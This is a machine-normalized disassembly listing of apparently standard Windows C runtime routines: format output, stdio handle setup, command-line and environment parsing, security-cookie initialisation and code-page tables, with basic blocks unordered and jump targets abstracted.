mov esi 0x200
or r12d esi
jmp r-xdata
mov edi 0x10
bts r12d 0xf
cmp eax 0x73
je r-xdata
test r12b 0x40
je r-xdata
and r12d 0xfffffff7
cmp edi esi
cmovg edi esi
mov edi 0x1
jmp r-xdata
mov r8d r8d
mov edi 0x2d
lea rbx [ rbp - 0x40 ]
mov r15d r13d
jmp r-xdata
mov [ rsp + 0x6c ] r13d
jmp r-xdata
test r12d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x68 ] r10d
mov r14 [ rsp + 0x50 ]
mov r11d 0x20
jmp r-xdata
test r12b 0x4
je r-xdata
mov rdi rbx
mov esi r15d
mov r14d [ rsp + 0x58 ]
mov rsi [ rsp + 0x78 ]
sub r14d r15d
sub r14d edi
test r12b 0xc
jne r-xdata
mov rcx rbx
call sub_180023ce0
xor r10d r10d
mov r15d eax
jmp r-xdata
bts r12d 0x8
inc rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x70 ]
mov rcx rbx
call rax
mov edx [ rsp + 0x40 ]
mov [ rsp + 0x6c ] 0x1
jmp r-xdata
mov r13d 0x30
mov edx [ rsp + 0x4c ]
add ax 0x51
mov [ rsp + 0x5c ] r13w
lea edx [ r9 - 0xe ]
mov [ rsp + 0x5e ] ax
jmp r-xdata
cmp [ rsp + 0x48 ] esi
mov rbx [ r14 ]
mov eax 0x7fffffff
cmove edi eax
add r14 0x8
mov [ rsp + 0x50 ] r14
test r11b r12b
je r-xdata
mov ecx 0x75
cmp eax ecx
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
test r8 r8
je r-xdata
mov r14d [ rsp + 0x70 ]
mov rax r8
lea rbx [ rbp + 0x1bf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x4c ] ecx
or r12d r11d
mov eax 0x7
cmp eax 0x5a
je r-xdata
mov rax [ rbp - 0x50 ]
test rax rax
je r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx 0x20
mov r8 rsi
mov edx r14d
call sub_180029430
mov r14 [ rsp + 0x50 ]
xor r10d r10d
mov rsi [ rsp + 0x78 ]
or edx 0xffffffff
mov [ rsp + 0x40 ] edx
jmp r-xdata
mov rdx [ rsp + 0x78 ]
movzx ecx [ rsp + 0x60 ]
lea r8 [ rsp + 0x40 ]
call sub_1800293f8
add rdi r13
xor r10d r10d
test esi esi
jg r-xdata
mov r13d [ rsp + 0x44 ]
jmp r-xdata
mov eax 0x8000
test eax r12d
je r-xdata
test rbx rbx
mov r13d 0x1
cmove rbx [ rw-data ]
mov [ rsp + 0x44 ] r13d
mov rax rbx
jmp r-xdata
test rbx rbx
mov r15d r10d
cmove rbx [ rw-data ]
mov rsi rbx
test edi edi
jle r-xdata
mov r9d 0xa
mov ecx 0x78
cmp eax ecx
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax r14d
mov r14 [ rsp + 0x50 ]
lea rax [ rbp + 0x1bf ]
mov [ rsp + 0x48 ] edi
sub eax ebx
inc rbx
mov r15d eax
test esi r12d
je r-xdata
mov rax [ r14 ]
add r14 0x8
mov [ rsp + 0x50 ] r14
test rax rax
je r-xdata
cmp eax 0x61
je r-xdata
test edx edx
js r-xdata
mov rax [ rbp - 0x70 ]
lea r9 [ rbp - 0x70 ]
lea rcx [ rsp + 0x60 ]
movsxd r8 [ rax + 0x10c ]
mov rdx rdi
dec esi
call sub_180030928
xor r10d r10d
movsxd r13 eax
test eax eax
jle r-xdata
mov rsi [ rsp + 0x78 ]
jmp r-xdata
cmp [ rsp + 0x6c ] r10d
jne r-xdata
test edi edi
jne r-xdata
cmp [ rsi ] r10b
je r-xdata
mov edi 0x2d
lea eax [ rcx - 0x51 ]
jmp r-xdata
mov ecx edi
dec edi
test ecx ecx
jg r-xdata
test eax eax
je r-xdata
mov rbx [ rw-data ]
mov rcx rbx
call sub_180023ce0
xor r10d r10d
mov r15 rax
jmp r-xdata
mov rbx [ rax + 0x8 ]
test rbx rbx
je r-xdata
mov ecx 0x67
cmp eax 0x63
je r-xdata
mov edx [ rsp + 0x40 ]
dec edi
cmp [ rax ] r10w
je r-xdata
sub rax rbx
sar rax 0x1
mov r15d eax
jmp r-xdata
movzx ecx [ rsi ]
lea rdx [ rbp - 0x70 ]
call sub_18002f2c8
xor r10d r10d
test eax eax
je r-xdata
mov r9d 0x10
mov [ rsp + 0x70 ] eax
mov esi 0x200
lea r13d [ r9 + 0x20 ]
test r12b r12b
jns r-xdata
dec rbx
inc r15d
mov [ rbx ] r13b
jmp r-xdata
cmp [ rbx ] r13b
je r-xdata
mov edi 0x2d
bt r12d 0xb
jae r-xdata
add rax 0x2
inc r15d
inc rsi
cmp r15d edi
jl r-xdata
inc rsi
movsx r15d [ rax ]
mov r13d r10d
mov [ rsp + 0x44 ] r10d
jmp r-xdata
movsx eax [ rax ]
lea r13d [ rdi - 0x2c ]
cdq
mov [ rsp + 0x44 ] r13d
sub eax edx
sar eax 0x1
mov r15d eax
jmp r-xdata
jmp r-xdata
sub_18002a070
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x90
lea rcx [ rsp + 0x20 ]
call [ GetStartupInfoW@IAT ]
mov edx 0x58
lea ebp [ rdx - 0x38 ]
mov ecx ebp
call sub_180022c90
xor r14d r14d
mov rdx rax
test rax rax
jne r-xdata
mov [ rw-data ] rax
add rax 0xb00
mov ecx ebp
mov [ rw-data ] ecx
cmp rdx rax
jae r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ rsp + 0x62 ] r14w
je r-xdata
add rdx 0x9
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
mov r12d r14d
mov rbx r14
mov rax [ rsp + 0x68 ]
test rax rax
je r-xdata
or [ rdx - 0x9 ] 0xffffffffffffffff
mov [ rdx - 0x1 ] 0xa00
mov [ rdx + 0x3 ] r14d
mov [ rdx + 0x2f ] 0xa00
mov [ rdx + 0x31 ] 0xa
mov [ rdx + 0x47 ] r14d
mov [ rdx + 0x43 ] r14b
mov rax [ rw-data ]
add rdx 0x58
lea rcx [ rdx - 0x9 ]
add rax 0xb00
cmp rcx rax
jb r-xdata
mov ecx [ rw-data ]
lea eax [ r12 - 0x1 ]
mov [ rbx + rdi + 0x8 ] 0x81
neg eax
mov eax 0xfffffff6
sbb ecx ecx
add ecx 0xfffffff5
test r12d r12d
cmove ecx eax
call [ GetStdHandle@IAT ]
mov rbp rax
cmp rax 0xffffffffffffffff
je r-xdata
cmp [ rbx + rdi ] 0xfffffffffffffffe
je r-xdata
movsxd r12 [ rax ]
mov ebx 0x800
lea r13 [ rax + 0x4 ]
add r12 r13
cmp [ rax ] ebx
cmovl ebx [ rax ]
cmp ecx ebx
jge r-xdata
or [ rbx + rdi + 0x8 ] 0x40
mov [ rbx + rdi ] 0xfffffffffffffffe
test rax rax
je r-xdata
or [ rbx + rdi + 0x8 ] 0x80
jmp r-xdata
mov edi r14d
test ebx ebx
jle r-xdata
lea rdi [ rw-data ]
mov rdi [ rw-data ]
cmp [ rbx + rdi ] 0xffffffffffffffff
je r-xdata
mov ecx [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
mov rcx rax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
add rbx 0x58
inc r12d
cmp rbx 0x108
jl r-xdata
cmp [ r12 ] 0xffffffffffffffff
je r-xdata
mov ebx [ rw-data ]
mov edx [ rw-data ]
lea rcx [ rax + 0xb00 ]
mov [ rdi ] rax
add edx ebp
mov [ rw-data ] edx
cmp rax rcx
jae r-xdata
movzx eax al
mov [ rbx + rdi ] rbp
cmp eax 0x2
jne r-xdata
inc edi
inc r13
add r12 0x8
cmp edi ebx
jl r-xdata
cmp [ r12 ] 0xfffffffffffffffe
je r-xdata
add rdi 0x8
cmp edx ebx
jl r-xdata
lea rdx [ rax + 0x9 ]
cmp eax 0x3
jne r-xdata
or [ rbx + rdi + 0x8 ] 0x40
jmp r-xdata
test [ r13 ] 0x1
je r-xdata
mov edx 0x58
mov rcx rbp
call sub_180022c90
test rax rax
je r-xdata
jmp r-xdata
or [ rdx - 0x9 ] 0xffffffffffffffff
and [ rdx + 0x2f ] 0x80
mov [ rdx - 0x1 ] 0xa00
mov [ rdx + 0x3 ] r14d
mov [ rdx + 0x30 ] 0xa0a
mov [ rdx + 0x47 ] r14d
mov [ rdx + 0x43 ] r14b
mov rax [ rdi ]
add rdx 0x58
lea rcx [ rdx - 0x9 ]
add rax 0xb00
cmp rcx rax
jb r-xdata
mov edx [ rw-data ]
lea rcx [ rbx + rdi + 0x10 ]
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ rbx + rdi + 0x8 ] 0x8
test [ r13 ] 0x8
jne r-xdata
inc [ rbx + rdi + 0xc ]
jmp r-xdata
movsxd rbp edi
lea rcx [ rw-data ]
mov edx 0xfa0
mov rax rbp
and ebp 0x1f
sar rax 0x5
imul rbp rbp 0x58
add rbp [ rcx + rax * 8 ]
mov rax [ r12 ]
mov [ rbp ] rax
mov al [ r13 ]
lea rcx [ rbp + 0x10 ]
mov [ rbp + 0x8 ] al
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
mov rcx [ r12 ]
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ rbp + 0xc ]
sub_18002a344
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov esi 0x40
add rbx 0x8
dec rsi
jne r-xdata
lea rax [ rdi + 0xb00 ]
jmp r-xdata
mov rdi [ rbx ]
test rdi rdi
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp rdi rax
jb r-xdata
cmp [ rdi + 0xc ] 0x0
je r-xdata
mov rcx [ rbx ]
call sub_18002094c
and [ rbx ] 0x0
mov rax [ rbx ]
add rdi 0x58
add rax 0xb00
lea rcx [ rdi + 0x10 ]
call [ DeleteCriticalSection@IAT ]
sub_18002a3b8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
mov rbx [ rw-data ]
xor edi edi
test rbx rbx
jne r-xdata
call sub_18002b1e8
mov al [ rbx ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
lea eax [ rdi + 0x1 ]
mov edx 0x8
movsxd rcx eax
call sub_180022c90
mov rdi rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rcx rbx
call sub_180023ce0
lea rbx [ rbx + rax + 0x1 ]
inc edi
mov rbx [ rw-data ]
cmp [ rbx ] 0x0
je r-xdata
mov rcx rbx
call sub_18002094c
and [ rw-data ] 0x0
and [ rdi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
mov rcx rbx
call sub_180023ce0
cmp [ rbx ] 0x3d
lea esi [ rax + 0x1 ]
je r-xdata
movsxd rax esi
add rbx rax
cmp [ rbx ] 0x0
jne r-xdata
movsxd rbp esi
mov edx 0x1
mov rcx rbp
call sub_180022c90
mov [ rdi ] rax
test rax rax
je r-xdata
mov rbx [ rw-data ]
mov rcx [ rw-data ]
call sub_18002094c
and [ rw-data ] 0x0
jmp r-xdata
mov r8 rbx
mov rdx rbp
mov rcx rax
call sub_180025324
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
add rdi 0x8
sub_18002a4e8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r13 [ rsp + 0x60 ]
mov r14 r9
mov rdi r8
and [ r13 ] 0x0
mov r12 rdx
mov rbx rcx
mov [ r9 ] 0x1
test rdx rdx
je r-xdata
xor ebp ebp
mov [ rdx ] r8
add r12 0x8
inc [ r13 ]
test rdi rdi
je r-xdata
xor eax eax
test ebp ebp
mov sil 0x22
sete al
inc rbx
mov ebp eax
jmp r-xdata
movzx esi [ rbx ]
inc rbx
mov ecx esi
call sub_180030b24
test eax eax
je r-xdata
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test ebp ebp
jne r-xdata
test sil sil
je r-xdata
inc [ r13 ]
test rdi rdi
je r-xdata
cmp [ rbx ] 0x22
jne r-xdata
cmp sil 0x20
je r-xdata
dec rbx
inc rbx
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test rdi rdi
je r-xdata
cmp sil 0x9
jne r-xdata
test r12 r12
je r-xdata
cmp [ rbx ] 0x20
je r-xdata
xor esi esi
mov [ rdi - 0x1 ] 0x0
jmp r-xdata
inc [ r14 ]
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
and [ r12 ] 0x0
inc rbx
jmp r-xdata
cmp [ rbx ] 0x9
jne r-xdata
cmp [ rbx ] 0x0
je r-xdata
test r12 r12
je r-xdata
inc [ r14 ]
mov [ r12 ] rdi
add r12 0x8
cmp [ rbx ] 0x5c
je r-xdata
inc rbx
inc ecx
cmp [ rbx ] 0x22
jne r-xdata
test ecx ecx
jne r-xdata
test dl cl
jne r-xdata
dec ecx
test rdi rdi
je r-xdata
mov al [ rbx ]
test al al
je r-xdata
shr ecx 0x1
jmp r-xdata
test esi esi
je r-xdata
inc [ r13 ]
mov [ rdi ] 0x5c
inc rdi
test rdi rdi
je r-xdata
test esi esi
jne r-xdata
xor eax eax
xor edx edx
test esi esi
sete al
mov esi eax
lea rax [ rbx + 0x1 ]
cmp [ rax ] 0x22
jne r-xdata
inc [ r13 ]
jmp r-xdata
mov [ rdi ] 0x0
inc rdi
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov rbx rax
jmp r-xdata
cmp [ rbx ] 0x0
je r-xdata
inc rbx
jmp r-xdata
movsx ecx al
call sub_180030b24
test rdi rdi
je r-xdata
cmp al 0x9
je r-xdata
mov edx 0x1
xor ecx ecx
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ r13 ]
inc rbx
inc [ r13 ]
mov al [ rbx ]
mov [ rdi ] al
inc rdi
jmp r-xdata
mov al [ rbx ]
inc rbx
mov [ rdi ] al
inc rdi
inc [ r13 ]
sub_18002a6b8
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
lea rdi [ rw-data ]
mov r8d 0x104
xor ecx ecx
mov rdx rdi
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
mov rbx [ rw-data ]
mov [ rw-data ] rdi
test rbx rbx
je r-xdata
call sub_18002b1e8
mov rbx rdi
cmp [ rbx ] 0x0
jne r-xdata
or eax 0xffffffff
movsxd rcx [ rsp + 0x48 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
xor r8d r8d
xor edx edx
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18002a4e8
movsxd rsi [ rsp + 0x40 ]
mov rcx 0x1fffffffffffffff
cmp rsi rcx
jae r-xdata
lea rdx [ rcx + rsi * 8 ]
cmp rdx rcx
jb r-xdata
mov rcx rdx
call sub_180022c10
mov rdi rax
test rax rax
je r-xdata
lea r8 [ rax + rsi * 8 ]
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
mov rdx rdi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18002a4e8
mov r11d [ rsp + 0x40 ]
mov [ rw-data ] rdi
dec r11d
xor eax eax
mov [ rw-data ] r11d
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_18002a7b0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x40
call [ GetEnvironmentStringsW@IAT ]
xor r12d r12d
mov rdi rax
test rax rax
je r-xdata
xor eax eax
mov rbx rax
cmp [ rax ] r12w
je r-xdata
mov [ rsp + 0x38 ] r12
sub rbx rax
mov [ rsp + 0x30 ] r12
sar rbx 0x1
mov r8 rax
xor edx edx
lea r9d [ rbx + 0x1 ]
xor ecx ecx
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] r12
call [ WideCharToMultiByte@IAT ]
movsxd rbp eax
test eax eax
je r-xdata
add rbx 0x2
cmp [ rbx ] r12w
jne r-xdata
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
mov rcx rbp
call sub_180022c10
mov rsi rax
test rax rax
je r-xdata
add rbx 0x2
cmp [ rbx ] r12w
jne r-xdata
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] r12
lea r9d [ rbx + 0x1 ]
mov r8 rdi
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] ebp
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
mov rax rsi
jmp r-xdata
mov rcx rsi
call sub_18002094c
mov rsi r12
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
sub_18002a8a4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_18002a8dc
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_18002a914
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x20
mov rax [ rw-data ]
and [ rsp + 0x30 ] 0x0
mov rdi 0x2b992ddfa232
cmp rax rdi
je r-xdata
lea rcx [ rsp + 0x30 ]
call [ GetSystemTimeAsFileTime@IAT ]
mov rbx [ rsp + 0x30 ]
call [ GetCurrentProcessId@IAT ]
mov r11d eax
xor rbx r11
call [ GetCurrentThreadId@IAT ]
mov r11d eax
xor rbx r11
call [ GetTickCount@IAT ]
lea rcx [ rsp + 0x38 ]
mov r11d eax
xor rbx r11
call [ QueryPerformanceCounter@IAT ]
mov r11 [ rsp + 0x38 ]
xor r11 rbx
mov rax 0xffffffffffff
and r11 rax
mov rax 0x2b992ddfa233
cmp r11 rdi
cmove r11 rax
mov [ rw-data ] r11
not r11
mov [ rw-data ] r11
not rax
mov [ rw-data ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_18002a9c8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rcx + 0x1c ]
mov rbp rcx
mov esi 0x101
mov rcx rbx
mov r8d esi
xor edx edx
call sub_180021150
xor r11d r11d
lea rdi [ rbp + 0x10 ]
lea ecx [ r11 + 0x6 ]
movzx eax r11w
mov [ rbp + 0xc ] r11d
mov [ rbp + 0x4 ] r11
[ rdi ]
lea rdi [ rw-data ]
sub rdi rbp
mov al [ rdi + rbx ]
mov [ rbx ] al
inc rbx
dec rsi
jne r-xdata
lea rcx [ rbp + 0x11d ]
mov edx 0x100
mov al [ rcx + rdi ]
mov [ rcx ] al
inc rcx
dec rdx
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_18002aa54
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push rbp
lea rbp [ rax - 0x488 ]
sub rsp 0x580
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x470 ] rax
mov rsi rcx
mov ecx [ rcx + 0x4 ]
lea rdx [ rsp + 0x50 ]
call [ GetCPInfo@IAT ]
mov ebx 0x100
test eax eax
je r-xdata
xor edx edx
lea rcx [ rsi + 0x1d ]
xor eax eax
lea rcx [ rsp + 0x70 ]
cmp r8d 0x19
ja r-xdata
or [ rcx ] 0x10
lea eax [ rdx + 0x20 ]
jmp r-xdata
mov [ rcx ] al
inc eax
inc rcx
cmp eax ebx
jb r-xdata
mov al [ rsp + 0x56 ]
mov [ rsp + 0x70 ] 0x20
lea rdi [ rsp + 0x56 ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
lea eax [ rdx - 0x20 ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test al al
jne r-xdata
lea r8d [ rdx - 0x61 ]
lea eax [ r8 + 0x20 ]
cmp eax 0x19
ja r-xdata
mov rcx [ rbp + 0x470 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x580 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
inc edx
inc rcx
cmp edx ebx
jb r-xdata
movzx edx [ rdi + 0x1 ]
movzx r8d al
cmp r8d edx
ja r-xdata
mov eax [ rsi + 0xc ]
and [ rsp + 0x38 ] 0x0
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x30 ] eax
mov eax [ rsi + 0x4 ]
mov r9d ebx
mov [ rsp + 0x28 ] eax
lea rax [ rbp + 0x270 ]
mov edx 0x1
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_18002b4b8
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x70 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d ebx
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_18002252c
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x170 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d 0x200
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_18002252c
lea rdx [ rbp + 0x70 ]
lea r8 [ rbp + 0x170 ]
sub rdx rsi
lea r11 [ rbp + 0x270 ]
lea rcx [ rsi + 0x1d ]
sub r8 rsi
add rdi 0x2
mov al [ rdi ]
sub edx r8d
mov eax r8d
lea rcx [ rsp + r8 + 0x70 ]
lea r8d [ rdx + 0x1 ]
mov dl 0x20
call sub_180021150
test [ r11 ] 0x2
je r-xdata
or [ rcx ] 0x10
mov al [ rdx + rcx - 0x1d ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
mov al [ r8 + rcx - 0x1d ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test [ r11 ] 0x1
je r-xdata
jmp r-xdata
inc rcx
add r11 0x2
dec rbx
jne r-xdata
sub_18002ac44
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
call sub_180025c90
mov rdi rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xd
call sub_18002d0a8
nop
mov rbx [ rdi + 0xb8 ]
mov [ rsp + 0x30 ] rbx
cmp rbx [ rw-data ]
je r-xdata
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov ecx 0xd
call sub_18002cfa8
test rbx rbx
je r-xdata
mov rbx [ rax + 0xb8 ]
jmp r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rbx + 0x20 ]
call sub_1800268d0
mov rax [ rw-data ]
mov [ rdi + 0xb8 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x30 ] rax
[ rax ]
mov rbx [ rsp + 0x30 ]
[ rbx ]
jne r-xdata
test rbx rbx
jne r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
call sub_18002094c
sub_18002ad00
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_1800221bc
and [ rw-data ] 0x0
cmp ebx 0xfffffffe
jne r-xdata
cmp ebx 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp ebx 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rax [ rsp + 0x20 ]
mov [ rw-data ] 0x1
mov eax [ rax + 0x4 ]
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_18002ad90
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x38 ] rax
mov rsi rdx
call sub_18002ad00
xor ebx ebx
mov edi eax
test eax eax
jne r-xdata
lea r13 [ rw-data ]
mov ecx ebx
mov rbp rbx
mov rax r13
mov r12d 0x1
mov rcx rsi
call sub_18002a9c8
jmp r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_180021150
lea r10 [ rbp + rbp * 2 ]
lea r11 [ rw-data ]
shl r10 0x4
mov ebp 0x4
lea r8 [ r10 + r13 + 0x10 ]
add ecx r12d
add rbp r12
add rax 0x30
cmp ecx 0x5
jb r-xdata
xor eax eax
add r8 0x8
add r11 r12
sub rbp r12
jne r-xdata
cmp [ rcx + 0x1 ] bl
je r-xdata
cmp [ rax ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov rcx r8
cmp [ r8 ] bl
je r-xdata
mov [ rsi + 0x4 ] edi
sub edi 0x3a4
mov [ rsi + 0x8 ] r12d
je r-xdata
movzx edx [ rcx ]
movzx eax [ rcx + 0x1 ]
cmp edx eax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi 0xfde9
je r-xdata
mov ebx 0x411
sub edi 0x4
je r-xdata
add rcx 0x2
cmp [ rcx ] bl
jne r-xdata
lea r9 [ rdx + rsi + 0x1d ]
mov rcx [ rsp + 0x38 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x80 ]
add rsp 0x40
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
movzx ecx di
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
movzx eax [ rdi + rcx ]
mov [ rcx ] ax
add rcx 0x2
sub rdx r12
jne r-xdata
mov rcx rsi
call sub_18002aa54
mov ebx 0x804
jmp r-xdata
sub edi 0xd
je r-xdata
mov al [ r11 ]
add edx r12d
or [ r9 ] al
movzx eax [ rcx + 0x1 ]
add r9 r12
cmp edx eax
jbe r-xdata
lea rdx [ rsp + 0x20 ]
mov ecx edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
sub r10 rsi
mov [ rsi + 0xc ] ebx
lea rcx [ rsi + 0x10 ]
lea rdi [ r10 + r13 - 0xc ]
mov edx 0x6
mov ebx 0x412
jmp r-xdata
dec edi
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_180021150
mov [ rsi + 0x4 ] edi
mov [ rsi + 0xc ] ebx
cmp [ rsp + 0x20 ] r12d
jbe r-xdata
mov ebx 0x404
jmp r-xdata
mov [ rsi + 0x8 ] ebx
lea rax [ rsp + 0x26 ]
cmp [ rsp + 0x26 ] bl
je r-xdata
lea rax [ rsi + 0x1e ]
mov ecx 0xfe
cmp [ rax + 0x1 ] bl
je r-xdata
or [ rax ] 0x8
add rax r12
sub rcx r12
jne r-xdata
mov ecx [ rsi + 0x4 ]
sub ecx 0x3a4
je r-xdata
movzx edi [ rax ]
movzx ecx [ rax + 0x1 ]
cmp edi ecx
ja r-xdata
mov eax 0x411
sub ecx 0x4
je r-xdata
add rax 0x2
cmp [ rax ] bl
jne r-xdata
sub ecx edi
lea rdx [ rdi + rsi + 0x1d ]
add ecx r12d
lea rdi [ rsi + 0x10 ]
movzx eax bx
mov ecx 0x6
[ rdi ]
jmp r-xdata
mov eax 0x804
jmp r-xdata
sub ecx 0xd
